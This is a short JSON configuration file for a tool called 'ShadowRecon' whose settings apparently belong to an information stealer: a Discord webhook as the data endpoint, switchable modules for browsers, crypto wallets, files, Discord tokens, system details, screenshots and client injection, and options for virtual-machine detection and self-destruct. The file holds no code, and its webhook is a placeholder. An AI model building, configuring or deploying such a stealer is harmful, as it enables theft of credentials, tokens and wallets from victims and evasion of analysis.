{
  "app": {
    "name": "ShadowRecon",
    "version": "3.0.0",
    "environment": "development"
  },
  "webhook": {
    "url": "https://discord.com/api/webhooks/test",
    "timeout": 30000
  },
  "paths": {
    "temp": "/tmp",
    "output": "./output"
  },
  "modules": {
    "enabled": {
      "browsers": true,
      "crypto": false,
      "files": false,
      "discord": true,
      "system": true,
      "injection": false,
      "screenshot": true
    }
  },
  "security": {
    "enableVmDetection": false,
    "enableSelfDestruct": false
  }
}